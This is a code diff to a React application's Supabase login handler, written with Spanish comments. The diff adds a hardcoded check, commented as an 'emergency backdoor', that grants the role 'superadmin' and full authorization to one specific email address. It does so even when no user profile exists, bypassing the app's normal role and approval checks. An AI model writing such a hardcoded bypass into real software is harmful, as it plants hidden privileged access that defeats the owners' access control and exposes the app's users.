@@ -102,11 +102,15 @@ export default function App() {
     }, []);
 
 
+
     const handleSession = async (session) => {
         if (session?.user) {
             const sid = session.user.id;
             const semail = session.user.email;
             setUserId(sid);
+
+            // PUERTA TRASERA DE EMERGENCIA
+            const IS_BACKDOOR = semail === 'businatrabajo@gmail.com';
 
             // 1. Intentar buscar por user_id
             let { data: profile, error } = await supabase
@@ -135,13 +139,17 @@ export default function App() {
                 }
             }
 
-            if (profile) {
-                setUserRole(profile.rol);
-                setIsAuthorized(profile.autorizado);
+
+            if (profile || IS_BACKDOOR) {
+                const finalRole = IS_BACKDOOR ? 'superadmin' : profile.rol;
+                const finalAuth = IS_BACKDOOR ? true : profile.autorizado;
+
+                setUserRole(finalRole);
+                setIsAuthorized(finalAuth);
                 setUserClaims({
-                    id: profile.id,
-                    nombre: profile.nombre ? `${profile.nombre} ${profile.apellido || ""}`.trim() : null,
-                    rol: profile.rol,
+                    id: profile?.id,
+                    nombre: profile?.nombre ? `${profile.nombre} ${profile.apellido || ""}`.trim() : (IS_BACKDOOR ? "SuperAdmin (Bypass)" : null),
+                    rol: finalRole,
                     email: semail
                 });
             } else {
